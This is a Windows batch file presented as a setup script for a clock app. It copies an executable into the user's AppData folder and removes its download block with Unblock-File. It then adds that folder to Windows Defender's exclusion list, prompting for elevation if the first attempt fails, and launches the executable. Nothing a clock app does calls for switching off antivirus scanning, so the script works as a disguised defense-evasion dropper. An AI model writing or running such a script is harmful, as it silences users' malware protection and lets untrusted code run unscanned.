@echo off
setlocal EnableExtensions DisableDelayedExpansion
title Clock App Setup

set "APP_DIR=%LOCALAPPDATA%\clock_app"
set "SCRIPT_DIR=%~dp0"
set "EXE_NAME=clock_app_setup.exe"
set "INSTALLER_PATH=%~1"
set "COPIED_INSTALLER="
set "EXCLUSION_OK=0"
set "LOG_FILE=%TEMP%\clock_app_setup.log"

> "%LOG_FILE%" echo [%DATE% %TIME%] setup_clock_app.bat started

echo ==========================================
echo Clock App Setup
echo ==========================================
echo Log: "%LOG_FILE%"

if not defined INSTALLER_PATH (
  if exist "%SCRIPT_DIR%%EXE_NAME%" (
    set "INSTALLER_PATH=%SCRIPT_DIR%%EXE_NAME%"
    goto :found_installer
  )
  for %%F in ("%SCRIPT_DIR%clock_app*setup*.exe") do (
    if /I not "%%~fF"=="%~f0" (
      set "INSTALLER_PATH=%%~fF"
      goto :found_installer
    )
  )
  for %%F in ("%SCRIPT_DIR%*setup*.exe") do (
    if /I not "%%~fF"=="%~f0" (
      set "INSTALLER_PATH=%%~fF"
      goto :found_installer
    )
  )
)

:found_installer
if not defined INSTALLER_PATH (
  call :fail "Installer not found. Expected: %EXE_NAME%"
)

echo Target folder: "%APP_DIR%"
echo Installer source: "%INSTALLER_PATH%"
>> "%LOG_FILE%" echo Target folder: "%APP_DIR%"
>> "%LOG_FILE%" echo Installer source: "%INSTALLER_PATH%"

if not exist "%APP_DIR%" mkdir "%APP_DIR%" >> "%LOG_FILE%" 2>&1
if not exist "%APP_DIR%" (
  call :fail "Failed to create %APP_DIR%"
)

for %%I in ("%INSTALLER_PATH%") do set "COPIED_INSTALLER=%APP_DIR%\%%~nxI"

echo [1/5] Copying installer...
copy /Y "%INSTALLER_PATH%" "%COPIED_INSTALLER%" >> "%LOG_FILE%" 2>&1
if errorlevel 1 (
  call :fail "Failed to copy installer to %APP_DIR%"
)

echo [2/5] Unblocking copied installer...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; Unblock-File -LiteralPath '%COPIED_INSTALLER%'" >> "%LOG_FILE%" 2>&1
if errorlevel 1 (
  call :fail "Unblock-File failed for %COPIED_INSTALLER%"
)

echo [3/5] Adding Defender exclusion...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $p=(Get-MpPreference).ExclusionPath; if ($p -notcontains '%APP_DIR%') { Add-MpPreference -ExclusionPath '%APP_DIR%' }" >> "%LOG_FILE%" 2>&1
if errorlevel 1 (
  echo [WARN] Standard add failed. Trying elevated Add-MpPreference...
  powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Start-Process powershell -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""$ErrorActionPreference=''''Stop''''; Add-MpPreference -ExclusionPath ''''%APP_DIR%''''""'; exit 0 } catch { exit 1 }" >> "%LOG_FILE%" 2>&1
  if errorlevel 1 (
    echo [WARN] Elevated exclusion setup failed or was canceled.
    echo [WARN] Continue anyway. If installer is blocked, run this bat as Administrator.
  )
)

echo [4/5] Verifying Defender exclusion...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$p=(Get-MpPreference).ExclusionPath; if ($p -contains '%APP_DIR%') { exit 0 } else { exit 2 }" >> "%LOG_FILE%" 2>&1
if errorlevel 1 (
  echo [WARN] Exclusion not confirmed.
  set "EXCLUSION_OK=0"
) else (
  set "EXCLUSION_OK=1"
)

echo [5/5] Launching installer...
start "" "%COPIED_INSTALLER%" >> "%LOG_FILE%" 2>&1
if errorlevel 1 (
  call :fail "Failed to start installer: %COPIED_INSTALLER%"
)

echo ------------------------------------------
echo Completed. Continue in installer window.
if "%EXCLUSION_OK%"=="1" (
  echo Defender exclusion: OK
) else (
  echo Defender exclusion: NOT CONFIRMED
)
echo Log file: "%LOG_FILE%"
pause
exit /b 0

:fail
echo [ERROR] %~1
echo [ERROR] %~1 >> "%LOG_FILE%"
echo See log: "%LOG_FILE%"
pause
exit /b 1
